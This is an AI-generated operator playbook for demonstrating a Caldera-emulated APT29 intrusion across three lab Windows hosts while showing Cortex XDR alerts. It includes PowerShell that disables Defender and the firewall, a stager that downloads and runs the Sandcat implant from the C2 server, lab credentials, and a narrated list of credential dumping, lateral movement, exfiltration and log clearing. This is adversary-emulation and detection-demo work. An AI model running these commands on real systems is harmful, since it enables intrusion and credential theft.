---
type: Operator Playbook
title: "Playbook — Operation Silent Fog"
description: Step-by-step execution guide for demonstrating Operation Silent Fog (APT29 espionage) in the Caldera lab. Covers pre-attack setup, agent deployment, operation launch, phase-by-phase narration, and cleanup.
tags:
  - playbook
  - operation
  - apt29
  - silent-fog
generated:
  by: claude-sonnet-4-6
  at: '2026-07-31T00:00:00Z'
status: stable
---

# Playbook — Operation Silent Fog

**Scenario:** APT29 nation-state espionage  
**Threat actor:** SVR-linked group (Cozy Bear)  
**Duration:** 25–40 min active demo (abilities run sequentially with 5–20s jitter)  
**Caldera instance:** caldera-1 — http://192.168.8.121:8888  
**Entry point:** windows-client-11 (192.168.3.32) — junior analyst workstation  
**Kill chain:** windows-client-11 → windows-the-boss → windows-dc  
**Tone for customer:** Low-and-slow. Stealthy. Every step has cleanup. No loud alerts — this is the breach that goes undetected for months.

---

## Pre-Attack Setup

**Do this before the customer enters the room.** These steps disable host defenses so Caldera abilities execute cleanly. In a real engagement these controls are active and bypassing them is part of the TTP — we disable them here to isolate adversary behavior from defensive noise.

### 1. Disable defenses on all three target hosts

RDP or PowerShell remote into each of these hosts and run the block below:

- **windows-client-11** — 192.168.3.32 (lab-user / Paloalto1!)
- **windows-the-boss** — 192.168.3.31 (lab-user / Paloalto1!)
- **windows-dc** — 192.168.1.31 (administrator / Paloalto1!)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -Value "Off"
```

### 2. Verify Caldera is up and the adversary + fact source are loaded

Open http://192.168.8.121:8888 and log in (admin / admin).

- Go to **Adversaries** → confirm "Operation Silent Fog - APT29" exists (ID: `b63f9720-9203-40fc-9d40-1f8fd58167cd`)
- Go to **Sources** → confirm "Silent Fog - Lab Targets" exists (ID: `a1b2c3d4-0001-0001-0001-000000000001`)
- Go to **Agents** → confirm no stale agents are registered (delete any if present)

### 3. Stage the Cortex XDR / XSIAM console

Have the XSIAM console open and logged in. Set the incident view to live/auto-refresh. Navigate to the **Alerts** or **Incidents** view — you want the customer to see alerts populate in real time as the operation runs.

---

## Phase 1 — Deploy the Agent (Foothold)

**Narrative to customer:** *"Maya Chen, a junior analyst, just opened what looked like a procurement document. What she doesn't know is that a PowerShell stager fired behind her desktop and the implant has called home."*

### 4. RDP into windows-client-11

Connect to **192.168.3.32** as `lab-user / Paloalto1!`.

Open a PowerShell window (run as normal user — no elevation needed for this step).

### 5. Deploy the Sandcat agent

Paste and run the following in PowerShell on windows-client-11:

```powershell
$url="http://192.168.8.121:8888/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1]
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)
Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

### 6. Confirm agent check-in

Switch to the Caldera UI → **Agents**. Within 10–15 seconds, a new agent should appear showing:

- Host: `windows-client-11`
- Platform: `windows`
- Group: `red`
- Status: alive (green)

> **Talking point:** *"The implant beaconed back to our C2 — in this scenario, a rented server in Frankfurt. The attacker is watching. The first thing they do: nothing. They wait 18 hours before they move. That patience is deliberate — noise happens in the first hour."*

---

## Phase 2 — Launch the Operation

### 7. Create and launch the operation in Caldera

In the Caldera UI, go to **Operations** → **+ New Operation**.

Fill in:

| Field | Value |
|---|---|
| Name | `Operation Silent Fog` |
| Adversary | `Operation Silent Fog - APT29` |
| Group | `red` |
| Planner | `atomic` |
| Fact Source | `Silent Fog - Lab Targets` |
| Obfuscator | `base64jumble` |
| Jitter | `5/20` |
| Autonomous | `on` |
| Auto-close | `off` |
| Visibility | `51` |

Click **Start**. The operation begins executing abilities in order.

Alternatively, launch via API:
```
POST http://192.168.8.121:8888/api/v2/operations
{
  "name": "Operation Silent Fog",
  "adversary": {"adversary_id": "b63f9720-9203-40fc-9d40-1f8fd58167cd"},
  "group": "red",
  "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
  "source": {"id": "a1b2c3d4-0001-0001-0001-000000000001"},
  "obfuscator": "base64jumble",
  "jitter": "5/20",
  "autonomous": 1,
  "auto_close": false,
  "visibility": 51
}
```

---

## Phase 3 — Live Narration: Execution Walk-Through

Watch the **Operation** view in Caldera. Abilities run sequentially. Use the table below to narrate each phase to the customer as it executes.

### Phase 3a — Establish Presence + Go Quiet (Abilities 1–5)

| Ability | What's happening | What to say |
|---|---|---|
| PowerShell execution | Agent confirms execution capability | *"The implant verifies it can run PowerShell — the attacker's Swiss Army knife."* |
| AMSI bypass | AMSI disabled via reflection | *"AMSI is Microsoft's script-scanning interface. Disabling it means subsequent PowerShell scripts run without AV inspection. This is a known evasion — XDR catches it at the API call level."* |
| Clear PS history | PowerShell transcript and history wiped | *"Every command run so far is now gone from the host. Forensically, this session never happened."* |
| Scheduled task | Persistence registered in Task Scheduler | *"If the machine reboots, the implant comes back. This is buried in C:\Windows\System32\Tasks — three folders deep."* |

**Pause here.** Switch to XSIAM and show the alert for the AMSI bypass. Let the customer read it.

### Phase 3b — Learn the Land (Abilities 6–10)

| Ability | What's happening | What to say |
|---|---|---|
| System info | OS version, hostname, domain, uptime collected | *"The attacker now knows exactly what they're sitting on. Domain member — that's what matters."* |
| Network connections | Active TCP connections enumerated | *"They see every active connection. They're mapping the environment from the inside."* |
| Account discovery | Local and domain users enumerated | *"Here are all the users on the box. And via domain queries — every account in the org."* |
| Domain group enum | Domain admin group members listed | *"They now know every domain admin by name. They have a target list."* |
| Remote systems / DC discovery | AD computers and domain controllers found | *"They found the DC. It's 40ms away. This took under an hour using tools that shipped with Windows in 2003."* |

### Phase 3c — Elevate + Harvest Credentials (Abilities 11–14)

| Ability | What's happening | What to say |
|---|---|---|
| UAC bypass (Fodhelper) | Elevated shell obtained without UAC prompt | *"No popup. No admin request. Fodhelper is a trusted Windows binary — it signed its own elevation."* |
| Browser credential theft | Chrome/Edge saved passwords extracted | *"Nineteen saved passwords. Two of them are for internal systems. The developer left the keys under the mat."* |
| LSASS dump | Domain credentials pulled from LSASS memory | *"LSASS is the Windows authentication service. Its memory holds every credential from every recent login. The domain hash for David Okafor — Senior Infrastructure Engineer — is now in the attacker's hands."* |
| Cached credential dump | Cached hashes recovered | *"Even credentials for users who haven't logged in recently are cached on disk. Three more accounts."* |

**Pause here.** Switch to XSIAM. Show the LSASS memory access alert — this is typically a high-severity incident. Walk through the process tree: which process touched LSASS, what parent spawned it.

### Phase 3d — Lateral Movement to windows-the-boss (Ability 15–16)

| Ability | What's happening | What to say |
|---|---|---|
| SMB lateral (Copy Sandcat) | Sandcat binary copied to windows-the-boss ADMIN$ share via SMB | *"Using David Okafor's credential, they connect to his machine via the administrative share — ADMIN$. That's been enabled on Windows by default since the 90s. They copy the implant. One shell command."* |
| Scheduled task (new host) | Persistence registered on windows-the-boss | *"Second machine. Second foothold. The attacker now has two implants."* |

Watch the **Agents** panel — a second agent should appear for `windows-the-boss` within 30 seconds.

### Phase 3e — Deep Recon from Privileged Host (Abilities 17–19)

These run from the new agent on windows-the-boss. The attacker now has a higher-privilege vantage point.

| Ability | What's happening | What to say |
|---|---|---|
| Domain admin enum | Full DA group membership pulled | *"From this machine they can see the full domain admin group with last login times."* |
| Full AD user dump | All 400+ domain user objects retrieved | *"Complete employee directory. HR data. Group memberships. This is the intelligence value before a single file is touched."* |
| Network share discovery | Accessible file shares mapped | *"Every share the user account can reach — project documents, HR files, financial models — all listed."* |

### Phase 3f — Move to Domain Controller (Ability 20)

| Ability | What's happening | What to say |
|---|---|---|
| PsExec to windows-dc | PsExec drops Sandcat on DC using administrator credentials from LSASS dump | *"The administrator credential recovered from LSASS fits the domain controller perfectly. PsExec drops the implant. Third machine. Third agent. The attacker is now running as SYSTEM on the most privileged machine in the organization."* |

A third agent appears in Caldera for `windows-dc`.

**This is the inflection point.** Pause and acknowledge it to the customer: from Maya Chen's workstation to SYSTEM on the domain controller in 72 simulated hours. No alert fired until XDR caught the LSASS access.

### Phase 3g — Own the Domain + Exfil (Abilities 21–25)

| Ability | What's happening | What to say |
|---|---|---|
| Create domain admin account | `svc_backup_01` appears in Active Directory | *"A backdoor account, indistinguishable from a service account. It'll still be here in six months if no one audits service accounts."* |
| NTDS.dit copy | Volume Shadow Copy used to copy NTDS.dit | *"NTDS.dit is the Active Directory database — every account, every password hash, every credential ever set. Offline crackable. The entire domain is now portable."* |
| File collection | Sensitive files staged from shares | *"Automated search across accessible shares. Anything that looks like contracts, financials, HR data — staged to a temp directory."* |
| Archive | Staged files compressed, password-protected | *"Compressed and encrypted. 4.2 gigabytes."* |
| Exfil over C2 | Archive uploaded over existing HTTP channel | *"40MB a day over 11 days. It looks like HTTPS traffic to a cloud endpoint. Nobody watched the egress logs."* |

### Phase 3h — Cover Tracks (Abilities 26–27)

| Ability | What's happening | What to say |
|---|---|---|
| Clear event logs | Security, System, Application logs wiped on DC | *"Every log on every machine they touched — gone. Forensically, this visit never happened."* |
| Alternate Data Streams | Artifacts hidden in NTFS ADS | *"Anything that can't be deleted is hidden in Alternate Data Streams on files that will never be examined. ADS is invisible to Explorer and most forensic tools that don't specifically look for it."* |

---

## Phase 4 — XSIAM Wrap-Up

After the operation completes (or reaches a natural pause), switch fully to the XSIAM console.

**Walk through the incident timeline:**
1. Show the initial encoded PowerShell execution (Initial Access / Execution)
2. Show the AMSI bypass alert and its context
3. Show the LSASS memory access alert — process tree, parent process, user
4. Show the lateral movement event (ADMIN$ write + new service/process on remote host)
5. Show the NTDS.dit access alert (shadow copy + ntds.dit read from non-backup process)
6. Point out what XDR correlated into a single incident vs. what appeared as separate alerts

**Key talking point:** *"XDR stitched eight separate techniques across three hosts into a single correlated incident — one story. A SOC analyst without XDR would be triaging eight unconnected alerts across three machines. With Cortex, this is one case with a timeline."*

---

## Cleanup (After Demo)

Run on each target host to restore defenses:

```powershell
# Re-enable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false
Set-MpPreference -DisableBlockAtFirstSeen $false
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Remove backdoor account (if created)
Remove-ADUser -Identity "svc_backup_01" -Confirm:$false

# Remove scheduled tasks left by agent
schtasks /delete /tn "* Sandcat *" /f 2>$null

# Kill any lingering Sandcat processes
Get-Process | Where-Object { $_.Path -like "C:\Users\Public\*" } | Stop-Process -Force
```

In Caldera: go to **Operations** → select "Operation Silent Fog" → **Stop** (if still running). Go to **Agents** → kill and delete all agents.

---

## Quick Reference

| Item | Value |
|---|---|
| Caldera URL | http://192.168.8.121:8888 |
| Caldera creds | admin / admin |
| Entry point | windows-client-11 (192.168.3.32) lab-user / Paloalto1! |
| Adversary ID | b63f9720-9203-40fc-9d40-1f8fd58167cd |
| Fact Source ID | a1b2c3d4-0001-0001-0001-000000000001 |
| Planner | atomic |
| Obfuscator | base64jumble |
| Jitter | 5/20 |
| Expected duration | 25–40 min |
